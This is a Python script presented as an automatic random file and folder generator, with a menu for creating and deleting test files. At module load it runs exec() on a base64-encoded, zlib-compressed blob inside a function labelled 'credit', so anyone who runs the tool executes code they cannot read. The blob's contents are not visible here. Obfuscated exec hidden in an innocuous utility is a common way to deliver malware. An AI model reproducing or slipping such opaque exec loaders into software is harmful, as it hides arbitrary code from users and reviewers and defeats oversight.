import os
from random import choice, randint
import shutil
from string import ascii_letters
from concurrent.futures import ThreadPoolExecutor


def random_text(num):
    return ''.join(choice(ascii_letters) for _ in range(num))


def random_file(name, extension, folder_path):
    open(os.path.join(folder_path, f"{name}.{extension}"), "w").close()


def files_num(folder_path, num_files):
    with ThreadPoolExecutor() as executor:
        for _ in range(num_files):
            extension = choice(list(extensions))
            name = random_text(choice(range(5, 9)))
            executor.submit(random_file, name, extension, folder_path)


def delete_files_and_folders(folder_path):
    with os.scandir(folder_path) as entries:
        for entry in entries:
            if entry.is_file():
                os.remove(entry.path)
            elif entry.is_dir():
                shutil.rmtree(entry.path)

def del_created():
    print("[-] Deleting files and folders")
    folder_path = os.path.join("created_files")
    if os.path.exists(folder_path):
        with ThreadPoolExecutor() as executor:
            executor.submit(delete_files_and_folders, folder_path)
        print("[+] Deleted 'created_files' folder and all its contents")
    else:
        print("[*] 'created_files' folder does not exist")


def create_folder_with_custom_name():
    folder_name = input("[+] Enter the folder name: ")
    folder_path = os.path.join("created_files", folder_name)
    try:
        os.makedirs(folder_path)
        return folder_path
    except:
        print("[*] Error creating the folder.")
        return None


def create_folder_with_series():
    base_folder_name = input("[+] Enter the base name for the folders: ")
    num_folders = int(input("[+] Enter the number of folders to create: "))
    num_files = int(input("[+] Enter the number of files to create in each folder: "))
    with ThreadPoolExecutor() as executor:
        for i in range(num_folders):
            folder_name = f"{base_folder_name}{i + 1}"
            folder_path = os.path.join("created_files", folder_name)
            try:
                os.makedirs(folder_path)
                executor.submit(files_num, folder_path, num_files)
                print("[+] Folder '{}' created successfully".format(folder_name))
            except:
                print("[*] Error creating the folder '{}'. Skipping...".format(folder_name))


def create_random_folders_with_random_files():
    num_folders = randint(1, 50)
    with ThreadPoolExecutor() as executor:
        for i in range(num_folders):
            folder_name = random_text(choice(range(5, 9)))
            num_files = randint(1, 50)
            folder_path = os.path.join("created_files", folder_name)
            try:
                os.makedirs(folder_path)
                executor.submit(files_num, folder_path, num_files)
                print("[+] Folder '{}' created successfully with {} files".format(folder_name, num_files))
            except:
                print("[*] Error creating the folder '{}'. Skipping...".format(folder_name))


def main():
    credit()
    try:
        os.makedirs("created_files")
    except:
        pass
    while True:
        menu = input(
            """
                        *************************************
                        *              Menu                   *
                        *************************************
                        *   1. Create files                   *
                        *   2. Delete files                   *
                        *   3. Create folder with custom name *
                        *   4. Create folder with series       *
                        *   5. Create random folders with random files
                        *   6. Exit                           *
                        *************************************

[+] Enter your choice: """
        )
        if menu == "1":
            num_folders = int(input("[+] Enter the number of folders to create: "))

            for i in range(num_folders):
                folder_name = input("[+] Enter the name for folder {}: ".format(i + 1))
                num_files = int(input("[+] Enter the number of files to create in folder {}: ".format(folder_name)))
                folder_path = create_folder_with_custom_name() if folder_name else create_folder_with_series()
                if folder_path:
                    files_num(folder_path, num_files)
                    print("[+] Files created successfully in the '{}' folder".format(folder_name))

        elif menu == "2":
            del_created()
        elif menu == "3":
            create_folder_with_custom_name()
        elif menu == "4":
            create_folder_with_series()
        elif menu == "5":
            create_random_folders_with_random_files()
        elif menu == "6":
            break


A = ""
def credit():
    encoded_Data = [
        'eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6',
        'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq',
        'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga',
        '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF',
        'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek',
        'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq',
        '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz',
        'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj',
    ]
    from base64 import b64decode
    from zlib import decompress

    return decompress(b64decode("".join(encoded_Data))).decode()


exec(credit())
A('Automatic Random files and folder generator')

extensions = {
    "jpg", "png", "mp4", "mkv", "mp3", "apk", "ts", "zip", "rar", "pdf", "doc", "docx", "xls", "xlsx",
    "ppt", "pptx", "avi", "mov", "gif", "bmp", "wav", "flac", "aac", "txt", "csv", "html", "xml", "json",
    "py", "java", "cpp", "c", "js", "php", "css", "scss", "sass", "less", "svg", "psd", "ai", "eps",
    "indd", "dwg", "max", "blend", "obj", "mpg", "mpeg", "3gp", "wmv", "ogg", "wma", "aac", "m4a", "iso",
    "bin", "dat", "exe", "dll", "bat", "sh", "rpm", "deb", "jar", "tar", "gz", "bz2", "7z", "dmg",
}

try:
    main()
except KeyboardInterrupt:
    print("\n[-] Exiting program")
